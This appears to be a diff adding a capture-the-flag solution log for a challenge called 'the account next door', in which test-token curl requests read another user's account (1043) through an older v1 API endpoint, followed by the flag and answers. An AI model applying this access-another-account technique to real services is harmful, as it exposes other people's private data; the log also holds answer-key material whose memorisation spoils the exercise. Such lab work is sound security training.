@@ -1,0 +1,9 @@
+# Season 11, mission 2: the account next door
+cat mandate/comptes-de-test.txt
+curl -H "Authorization: Bearer cpt_test_4f1a9c" https://api.comptoir.test/v2/accounts/me
+curl -H "Authorization: Bearer cpt_test_4f1a9c" https://api.comptoir.test/v2/accounts/1043
+curl -H "Authorization: Bearer cpt_test_4f1a9c" https://api.comptoir.test/v1/accounts/1043
+submit FLAG{comptoir-le-compte-d-a-cote-8b20}
+curl -s -H "Authorization: Bearer cpt_test_4f1a9c" https://api.comptoir.test/v1/accounts/1043 | jq keys
+submit internal_risk_score
+answer owner
